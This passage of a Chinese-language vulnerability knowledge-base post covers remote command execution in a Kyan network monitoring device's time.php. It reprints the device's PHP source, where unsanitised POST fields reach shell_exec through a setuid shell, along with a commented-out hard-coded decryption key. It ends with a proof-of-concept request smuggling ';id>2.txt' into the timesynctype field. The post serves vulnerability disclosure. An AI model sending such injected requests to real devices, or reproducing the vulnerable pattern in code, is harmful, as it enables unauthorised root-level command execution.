+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">tr</span><span class="w"> </span><span class="o">&gt;&lt;</span><span class="n">td</span><span class="w"> </span><span class="n">colspan</span><span class="o">=</span><span class="err">&#34;2&#34;</span><span class="w"> </span><span class="n">align</span><span class="o">=</span><span class="err">&#34;</span><span class="n">center</span><span class="err">&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">form</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="err">&#34;</span><span class="n">Form1</span><span class="err">&#34;</span><span class="w"> </span><span class="n">method</span><span class="o">=</span><span class="err">&#34;</span><span class="n">post</span><span class="err">&#34;</span><span class="w"> </span><span class="n">action</span><span class="o">=&lt;?</span><span class="n">php</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="err">$</span><span class="n">_SERVER</span><span class="p">[</span><span class="err">&#39;</span><span class="n">PHP_SELF</span><span class="err">&#39;</span><span class="p">]</span><span class="o">?&gt;&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">input</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="err">&#34;</span><span class="n">hidden</span><span class="err">&#34;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="err">&#34;</span><span class="n">cdate</span><span class="err">&#34;</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="err">&#34;</span><span class="n">cdate</span><span class="err">&#34;</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="err">&#34;&#34;</span><span class="o">/&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">input</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="err">&#34;</span><span class="n">hidden</span><span class="err">&#34;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="err">&#34;</span><span class="n">ctime</span><span class="err">&#34;</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="err">&#34;</span><span class="n">ctime</span><span class="err">&#34;</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="err">&#34;&#34;</span><span class="o">/&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="n">lang_get</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Sync</span><span class="w"> </span><span class="n">Source</span><span class="err">&#39;</span><span class="p">);</span><span class="o">?&gt;:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">select</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="err">&#34;</span><span class="n">timesynctype</span><span class="err">&#34;</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="err">&#34;</span><span class="n">timesynctype</span><span class="err">&#34;</span><span class="w"> </span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">option</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="err">&#34;</span><span class="n">time</span><span class="p">.</span><span class="n">windows</span><span class="p">.</span><span class="n">com</span><span class="err">&#34;</span><span class="w"> </span><span class="n">selected</span><span class="o">=</span><span class="err">&#34;</span><span class="n">selected</span><span class="err">&#34;</span><span class="o">&gt;</span><span class="n">time</span><span class="p">.</span><span class="n">windows</span><span class="p">.</span><span class="n">com</span><span class="o">&lt;/</span><span class="n">option</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">option</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="err">&#34;</span><span class="n">time</span><span class="p">.</span><span class="n">nist</span><span class="p">.</span><span class="n">gov</span><span class="err">&#34;</span><span class="o">&gt;</span><span class="n">time</span><span class="p">.</span><span class="n">nist</span><span class="p">.</span><span class="n">gov</span><span class="o">&lt;/</span><span class="n">option</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/*$system_lic_file = &#39;/mnt/licenses/system/system.dat&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cm">$bsynctoclient=false;
+</span></span></span><span class="line"><span class="cl"><span class="cm">if(file_exists($system_lic_file))
+</span></span></span><span class="line"><span class="cl"><span class="cm">{
+</span></span></span><span class="line"><span class="cl"><span class="cm">	$output = shell_exec(&#34;/bin/bashsuid -p -c \&#34;openssl bf-cbc -K 000102030405060708090A0B0C0D0E0F -iv 0102030405060708 -d -in /mnt/licenses/system/system.dat |grep -v \&#34;^;\&#34;|grep Expire\&#34;&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="cm">	if($output == &#34;&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="cm">	{
+</span></span></span><span class="line"><span class="cl"><span class="cm">		$bsynctoclient = true;
+</span></span></span><span class="line"><span class="cl"><span class="cm">	}else
+</span></span></span><span class="line"><span class="cl"><span class="cm">	{
+</span></span></span><span class="line"><span class="cl"><span class="cm">		$bsynctoclient = false;
+</span></span></span><span class="line"><span class="cl"><span class="cm">	}
+</span></span></span><span class="line"><span class="cl"><span class="cm">	
+</span></span></span><span class="line"><span class="cl"><span class="cm">}
+</span></span></span><span class="line"><span class="cl"><span class="cm">if($bsynctoclient)
+</span></span></span><span class="line"><span class="cl"><span class="cm">{*/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="o">&lt;</span><span class="n">option</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="err">\&#34;</span><span class="n">client</span><span class="err">\&#34;</span><span class="w"> </span><span class="o">&gt;</span><span class="err">&#34;</span><span class="p">.</span><span class="n">lang_get</span><span class="p">(</span><span class="err">&#39;</span><span class="n">PC</span><span class="w"> </span><span class="n">Client</span><span class="err">&#39;</span><span class="p">).</span><span class="err">&#34;</span><span class="o">&lt;/</span><span class="n">option</span><span class="o">&gt;</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/* } */</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">select</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">input</span><span class="w">  </span><span class="n">type</span><span class="o">=</span><span class="err">&#34;</span><span class="n">submit</span><span class="err">&#34;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="err">&#34;</span><span class="n">update</span><span class="err">&#34;</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="err">&#34;</span><span class="n">update</span><span class="err">&#34;</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="err">&#34;</span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="n">lang_get</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Update</span><span class="w"> </span><span class="n">Now</span><span class="err">&#39;</span><span class="p">);</span><span class="o">?&gt;</span><span class="err">&#34;</span><span class="w"> </span><span class="o">/&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">td</span><span class="o">&gt;&lt;/</span><span class="n">tr</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">table</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;?</span><span class="n">php</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//print_html_end();
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中需要注意的地方</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-zed" data-lang="zed"><span class="line"><span class="cl"><span class="n">if</span><span class="p">(</span><span class="err">$</span><span class="n">_SERVER</span><span class="p">[</span><span class="err">&#39;</span><span class="n">REQUEST_METHOD</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="err">&#39;</span><span class="n">POST</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">if</span><span class="p">(</span><span class="o">!</span><span class="n">user_is_admin</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">showErrMessage</span><span class="p">(</span><span class="err">&#34;</span><span class="kd">permission</span><span class="w"> </span><span class="n">denied</span><span class="err">&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">exit</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="err">$</span><span class="n">timesynctype</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="err">&#34;</span><span class="n">timesynctype</span><span class="err">&#34;</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">if</span><span class="p">(</span><span class="err">$</span><span class="n">timesynctype</span><span class="o">!=</span><span class="err">&#34;</span><span class="n">client</span><span class="err">&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="err">$</span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shell_exec</span><span class="p">(</span><span class="err">&#34;</span><span class="o">/</span><span class="nn">bin/</span><span class="n">bashsuid</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">\&#34;</span><span class="o">/</span><span class="nn">usr/sbin/</span><span class="n">ntpdate</span><span class="w"> </span><span class="err">&#34;</span><span class="w"> </span><span class="p">.</span><span class="err">$</span><span class="n">timesynctype</span><span class="p">.</span><span class="w"> </span><span class="err">&#34;\&#34;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">showMessage</span><span class="p">(</span><span class="err">$</span><span class="n">output</span><span class="p">);</span><span class="w">		
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">shell_exec</span><span class="p">(</span><span class="err">&#34;</span><span class="o">/</span><span class="nn">bin/</span><span class="n">bashsuid</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">\&#34;</span><span class="n">hwclock</span><span class="w"> </span><span class="o">--</span><span class="n">systohc</span><span class="err">\&#34;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="n">else</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="err">$</span><span class="n">ctime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="err">&#34;</span><span class="n">ctime</span><span class="err">&#34;</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">shell_exec</span><span class="p">(</span><span class="err">&#34;</span><span class="o">/</span><span class="nn">bin/</span><span class="n">bashsuid</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">\&#34;</span><span class="n">date</span><span class="w"> </span><span class="err">&#34;</span><span class="w"> </span><span class="p">.</span><span class="err">$</span><span class="n">ctime</span><span class="p">.</span><span class="w"> </span><span class="err">&#34;\&#34;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">shell_exec</span><span class="p">(</span><span class="err">&#34;</span><span class="o">/</span><span class="nn">bin/</span><span class="n">bashsuid</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">\&#34;</span><span class="n">hwclock</span><span class="w"> </span><span class="o">--</span><span class="n">systohc</span><span class="err">\&#34;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>参数均可控，构造POC</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /time.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">timesynctype=;id&gt;2.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205191753984.png"
+        data-srcset="/images/202205191753984.png, /images/202205191753984.png 1.5x, /images/202205191753984.png 2x"
+        data-sizes="auto"
+        alt="/images/202205191753984.png"
+        title="image-20220519175346874" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-title="Kyan 网络监控设备 time.php 远程命令执行漏洞" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-title="Kyan 网络监控设备 time.php 远程命令执行漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-title="Kyan 网络监控设备 time.php 远程命令执行漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-title="Kyan 网络监控设备 time.php 远程命令执行漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/" class="prev" rel="prev" title="Lanproxy 目录遍历漏洞 CVE-2021-3019"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Lanproxy 目录遍历漏洞 CVE-2021-3019</a>
+            <a href="/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="Kyan 网络监控设备 run.php 远程命令执行漏洞">Kyan 网络监控设备 run.php 远程命令执行漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
